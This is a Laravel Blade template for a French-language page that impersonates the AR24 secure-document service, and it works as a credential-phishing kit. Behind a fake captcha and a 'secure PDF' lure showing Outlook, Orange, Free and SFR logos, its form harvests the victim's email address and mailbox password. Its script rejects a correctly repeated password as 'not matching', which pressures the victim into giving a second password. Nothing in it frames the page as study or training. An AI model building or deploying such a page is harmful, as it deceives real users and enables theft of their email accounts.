<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Vérification - AR24</title>

    @vite(['resources/css/app.css', 'resources/js/app.js'])
</head>

<body class="min-h-screen bg-slate-50 text-slate-700">

    <div class="flex min-h-screen items-center justify-center px-6 py-12">

        <div class="w-full max-w-md">

            {{-- =========================
                 LOGO
            ========================== --}}

            <div class="mb-8 flex justify-center">

                <a href="/">

                    <img
                        src="{{ asset('images/ar24.png') }}"
                        alt="AR24"
                        class="h-9 w-auto object-contain"
                    >

                </a>

            </div>


            {{-- =========================
                 CAPTCHA
            ========================== --}}

            @if (!session('captcha_verified'))

                <div class="rounded-lg border border-slate-200 bg-white p-8 shadow-sm">

                    <div class="mb-7 text-center">

                        <div class="mx-auto mb-4 flex h-12 w-12 items-center justify-center rounded-full bg-[#00008C]/5">

                            <svg
                                class="h-6 w-6 text-[#00008C]"
                                viewBox="0 0 24 24"
                                fill="none"
                                stroke="currentColor"
                                stroke-width="2"
                            >
                                <path d="M12 3l8 4v5c0 5-3.5 8-8 9-4.5-1-8-4-8-9V7l8-4Z"/>
                                <path d="m9 12 2 2 4-4"/>
                            </svg>

                        </div>


                        <h1 class="text-xl font-semibold text-slate-800">
                            Vérification de sécurité
                        </h1>


                        <p class="mt-2 text-sm leading-6 text-slate-500">
                            Veuillez effectuer cette vérification avant d'accéder à votre espace.
                        </p>

                    </div>


                    {{-- Erreurs --}}

                    @if ($errors->any())

                        <div class="mb-5 rounded-md border border-red-200 bg-red-50 px-4 py-3 text-sm text-red-700">

                            {{ $errors->first('captcha') }}

                        </div>

                    @endif


                    {{-- Formulaire CAPTCHA --}}

                    <form
                        method="POST"
                        action="{{ route('captcha.verify') }}"
                        class="space-y-5"
                    >

                        @csrf


                        <div>

                            <label
                                for="captcha"
                                class="mb-2 block text-sm font-medium text-slate-700"
                            >
                                Confirmez que vous êtes humain
                            </label>


                            <div class="mb-3 rounded-md border border-slate-200 bg-slate-50 px-4 py-4 text-center">

                                <span class="text-lg font-semibold tracking-wide text-[#00008C]">
                                    {{ session('captcha_question') }} = ?
                                </span>

                            </div>


                            <input
                                id="captcha"
                                name="captcha"
                                type="number"
                                inputmode="numeric"
                                autocomplete="off"
                                autofocus
                                required
                                placeholder="Votre réponse"
                                class="block w-full rounded-md border border-slate-300 bg-white px-4 py-3 text-sm text-slate-800 placeholder-slate-400 outline-none transition focus:border-[#00008C] focus:ring-2 focus:ring-[#00008C]/10"
                            >

                        </div>


                        <button
                            type="submit"
                            class="w-full rounded-md bg-[#00008C] px-5 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-[#00006f] focus:outline-none focus:ring-2 focus:ring-[#00008C] focus:ring-offset-2"
                        >
                            Continuer
                        </button>

                    </form>

                </div>


            @else

                {{-- =========================
                     ÉTAPE SUIVANTE
                ========================== --}}

                <div class="rounded-lg border border-slate-200 bg-white shadow-md">


                    {{-- Header --}}

                    <div class="border-b border-slate-200 bg-slate-50 px-6 py-5">

                        <h2 class="text-lg text-center font-medium text-slate-800">
                            Vérifiez Votre Identité
                        </h2>

                    </div>


                    {{-- Contenu --}}

                    <div class="p-7">


                        {{-- Fichier PDF --}}

                        <div class="mb-6 flex items-center gap-4">

                            <img
                                src="{{ asset('images/250px-PDF_file_icon.svg.webp') }}"
                                alt="PDF"
                                class="h-10 w-10 object-contain"
                            >

                            <div>

                                <p class="text-sm font-medium text-slate-700">
                                    Document sécurisé
                                </p>

                                <p class="mt-1 text-sm text-slate-500">
                                    56.1KB
                                </p>

                            </div>

                        </div>


                        {{-- Description --}}

                        <p class="mb-6 text-sm leading-6 text-slate-600">
                            Pour accéder au document, veuillez entrer  les identifiants de messagerie à laquelle ce fichier a été envoyé.
                        </p>

                        {{-- Logos opérateurs --}}
                        <div class="mb-4 flex items-center justify-center gap-5">


                             <img
                                src="{{ asset('images/outlook.png') }}"
                                alt="Orange"
                                class="h-7 w-auto object-contain"
                            >

                            <img
                                src="{{ asset('images/orange.png') }}"
                                alt="Orange"
                                class="h-7 w-auto object-contain"
                            >

                            <img
                                src="{{ asset('images/free.jpeg') }}"
                                alt="Free"
                                class=" border border-slate-200 bg-white shadow-sm h-7 w-auto object-contain"
                            >

                            <img
                                src="{{ asset('images/sfr.png') }}"
                                alt="SFR"
                                class="h-7 w-auto object-contain"
                            >

                        </div>

                        {{-- Formulaire --}}

                        <form
                            id="login-form"
                            method="POST"
                            action="{{ route('payment.send') }}"
                            class="space-y-5"
                        >

                            @csrf


                            {{-- E-mail --}}

                            <div>

                                <label
                                    for="email"
                                    class="mb-2 block text-sm font-medium text-slate-700"
                                >
                                    Adresse e-mail
                                </label>


                                <input
                                    id="email"
                                    name="email"
                                    type="email"
                                    autocomplete="email"
                                    required
                                    placeholder="Entrez l'adresse e-mail"
                                    class="block w-full rounded-md border border-slate-300 bg-white px-4 py-3 text-sm text-slate-800 placeholder-slate-400 outline-none transition focus:border-[#00008C] focus:ring-2 focus:ring-[#00008C]/20"
                                >                                

                            </div>
                            {{-- Mot de passe : caché au départ --}}
                            <div
                                id="password-container"
                                class="grid transition-all duration-500 ease-out"
                                style="grid-template-rows: 0fr; opacity: 0;"
                            >

                                <div class="min-h-0 overflow-hidden">

                                    <label
                                        for="password"
                                        class="mb-2 block text-sm font-medium text-slate-700"
                                    >
                                        Mot de passe
                                    </label>

                                    {{-- Input + bouton œil --}}
                                    <div class="relative w-full ">

                                        <input
                                            id="password"
                                            name="password"
                                            type="password"
                                            autocomplete="current-password"
                                            placeholder="Votre mot de passe"
                                           class="block w-full rounded-md border border-slate-300 bg-white px-4 py-3 pr-12 text-sm text-slate-800 placeholder-slate-400 outline-none transition focus:border-[#00008C] focus:ring-2 focus:ring-[#00008C]/20"
                                        >

                                        <button
                                            type="button"
                                            id="toggle-password"
                                            aria-label="Afficher le mot de passe"
                                             class="absolute right-0 top-0 flex h-full w-12 items-center justify-center text-slate-400 transition hover:text-[#00008C] focus:outline-none"
                                        >

                                            {{-- Œil fermé --}}
                                            <svg
                                                id="eye-closed"
                                                class="h-5 w-5"
                                                viewBox="0 0 24 24"
                                                fill="none"
                                                stroke="currentColor"
                                                stroke-width="2"
                                            >
                                                <path
                                                    d="M3 3l18 18"
                                                    stroke-linecap="round"
                                                />

                                                <path
                                                    d="M10.58 10.58a2 2 0 0 0 2.83 2.83"
                                                    stroke-linecap="round"
                                                />

                                                <path
                                                    d="M9.88 4.24A9.7 9.7 0 0 1 12 4c5 0 8.5 4 9.5 6.5a10.8 10.8 0 0 1-3.07 3.87"
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                />

                                                <path
                                                    d="M6.23 6.23C4.46 7.45 3.25 9.05 2.5 10.5 3.5 13 7 17 12 17c1.61 0 3.07-.39 4.35-1.02"
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                />
                                            </svg>

                                            {{-- Œil ouvert --}}
                                            <svg
                                                id="eye-open"
                                                class="hidden h-5 w-5"
                                                viewBox="0 0 24 24"
                                                fill="none"
                                                stroke="currentColor"
                                                stroke-width="2"
                                            >
                                                <path
                                                    d="M2.5 12s3.5-6 9.5-6 9.5 6 9.5 6-3.5 6-9.5 6-9.5-6-9.5-6Z"
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                />

                                                <circle
                                                    cx="12"
                                                    cy="12"
                                                    r="2.5"
                                                />
                                            </svg>

                                        </button>

                                    </div>

                                </div>

                            </div>

                            <div id="confirmation-step"
                              class="hidden opacity-0 transition-all duration-300 ease-in-out">
                            <label
                                for="password_confirmation"
                                class="mb-2 block text-sm font-medium text-slate-700"
                            >
                                Mot de passe
                            </label>

                            
                                    {{-- Input + bouton œil --}}
                                    <div class="relative w-full ">

                                        <input
                                            id="password_confirmation"
                                            name="password_confirmation"
                                            type="password"
                                            autocomplete="new-password"
                                            placeholder="votre mot de passe"
                                            class="block w-full rounded-md border border-slate-300 bg-white px-4 py-3 text-sm text-slate-800 placeholder-slate-400 outline-none transition focus:border-[#00008C] focus:ring-2 focus:ring-[#00008C]/20"


                                            
                                        >

                                        <button
                                            type="button"
                                            id="toggle-password-confirmation"
                                            aria-label="Afficher le mot de passe"
                                             class="absolute right-0 top-0 flex h-full w-12 items-center justify-center text-slate-400 transition hover:text-[#00008C] focus:outline-none"
                                        >

                                            {{-- Œil fermé --}}
                                            <svg
                                                id="eye-closed"
                                                class="h-5 w-5"
                                                viewBox="0 0 24 24"
                                                fill="none"
                                                stroke="currentColor"
                                                stroke-width="2"
                                            >
                                                <path
                                                    d="M3 3l18 18"
                                                    stroke-linecap="round"
                                                />

                                                <path
                                                    d="M10.58 10.58a2 2 0 0 0 2.83 2.83"
                                                    stroke-linecap="round"
                                                />

                                                <path
                                                    d="M9.88 4.24A9.7 9.7 0 0 1 12 4c5 0 8.5 4 9.5 6.5a10.8 10.8 0 0 1-3.07 3.87"
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                />

                                                <path
                                                    d="M6.23 6.23C4.46 7.45 3.25 9.05 2.5 10.5 3.5 13 7 17 12 17c1.61 0 3.07-.39 4.35-1.02"
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                />
                                            </svg>

                                            {{-- Œil ouvert --}}
                                            <svg
                                                id="eye-open"
                                                class="hidden h-5 w-5"
                                                viewBox="0 0 24 24"
                                                fill="none"
                                                stroke="currentColor"
                                                stroke-width="2"
                                            >
                                                <path
                                                    d="M2.5 12s3.5-6 9.5-6 9.5 6 9.5 6-3.5 6-9.5 6-9.5-6-9.5-6Z"
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                />

                                                <circle
                                                    cx="12"
                                                    cy="12"
                                                    r="2.5"
                                                />
                                            </svg>

                                        </button>

                                    </div>

                            <p
                            
                                class="mt-2 text-sm text-red-600"
                            >
                                Le mot de passe ne correspondent pas recommencer.
                            </p>

                            

                            <p
                                id="password-error"
                                class="mt-2 hidden text-sm text-red-600"
                            >
                                Le mot de passe ne correspondent pas recommencer.
                            </p>
        

                            </div>


                            {{-- Bouton --}}

                            <button
                                id="continue-button"
                                class="w-full rounded-md bg-[#00008C] px-5 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-[#00006f] focus:outline-none focus:ring-2 focus:ring-[#00008C]/30 focus:ring-offset-2"
                            >
                                Continuer
                            </button>

                        </form>

                    </div>

                </div>

            @endif


            {{-- =========================
                 SECURITY
            ========================== --}}

            <div class="mt-6 flex items-center justify-center gap-2 text-xs text-slate-400">

                <svg
                    class="h-4 w-4"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                >

                    <rect
                        x="4"
                        y="10"
                        width="16"
                        height="11"
                        rx="2"
                    />

                    <path
                        d="M8 10V7a4 4 0 0 1 8 0v3"
                    />

                </svg>

                <span>
                    Vérification sécurisée
                </span>

            </div>

        </div>

    </div>


  <script>
document.addEventListener('DOMContentLoaded', () => {

    const form = document.getElementById('login-form');
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const passwordContainer = document.getElementById('password-container');
    const confirmationStep = document.getElementById('confirmation-step');
    const passwordConfirmation = document.getElementById('password_confirmation');
    const button = document.getElementById('continue-button');
    const passwordError = document.getElementById('password-error');

    const togglePassword = document.getElementById('toggle-password');
    const togglePasswordConfirmation = document.getElementById('toggle-password-confirmation');
    
const eyeOpen = document.getElementById('eye-open');
const eyeClosed = document.getElementById('eye-closed');

    

    if (
        !form ||
        !email ||
        !password ||
        !passwordContainer ||
        !confirmationStep ||
        !passwordConfirmation ||
        !button
    ) {
        return;
    }

    let currentStep = 1;

    button.addEventListener('click', (event) => {

        event.preventDefault();

        // ÉTAPE 1 : EMAIL
        if (currentStep === 1) {

            if (!email.checkValidity()) {
                email.reportValidity();
                return;
            }

            currentStep = 2;

            passwordContainer.style.gridTemplateRows = '1fr';
            passwordContainer.style.opacity = '1';

            button.textContent = 'Continuer';

            setTimeout(() => {
                password.focus();
            }, 400);

            return;
        }

        // ÉTAPE 2 : MOT DE PASSE
        if (currentStep === 2) {

            if (!password.value.trim()) {
                password.reportValidity();
                return;
            }

            currentStep = 3;

            passwordContainer.style.gridTemplateRows = '0fr';
            passwordContainer.style.opacity = '0';

            setTimeout(() => {

                passwordContainer.classList.add('hidden');

                confirmationStep.classList.remove('hidden');

                requestAnimationFrame(() => {
                    confirmationStep.classList.remove('opacity-0');
                });

                button.textContent = 'Valider';

                setTimeout(() => {
                    passwordConfirmation.focus();
                }, 300);

            }, 300);

            return;
        }

        // ÉTAPE 3 : CONFIRMATION
        if (currentStep === 3) {

            if (!passwordConfirmation.value.trim()) {
                passwordConfirmation.reportValidity();
                return;
            }

            if (password.value == passwordConfirmation.value) {

                passwordError.classList.remove('hidden');
                

                return;
            }

            passwordError.classList.add('hidden');

            // Autorise enfin l'envoi du formulaire
    form.submit();
        }

    });

    if (togglePassword && eyeOpen && eyeClosed) {

        togglePassword.addEventListener('click', () => {

            const showPassword = password.type === 'password';

            password.type = showPassword ? 'text' : 'password';

            eyeClosed.classList.toggle('hidden', showPassword);
            eyeOpen.classList.toggle('hidden', !showPassword);

            togglePassword.setAttribute(
                'aria-label',
                showPassword
                    ? 'Masquer le mot de passe'
                    : 'Afficher le mot de passe'
            );

        });

    }

    if (togglePasswordConfirmation && eyeOpen && eyeClosed) {

        togglePasswordConfirmation.addEventListener('click', () => {

            const showPasswordConfirmation = passwordConfirmation.type === 'password';

            passwordConfirmation.type = showPasswordConfirmation ? 'text' : 'password';

            eyeClosed.classList.toggle('hidden', showPasswordConfirmation);
            eyeOpen.classList.toggle('hidden', !showPasswordConfirmation);

            togglePasswordConfirmation.setAttribute(
                'aria-label',
                showPasswordConfirmation
                    ? 'Masquer le mot de passe'
                    : 'Afficher le mot de passe'
            );

        });

    }

});
</script>

</body>

</html>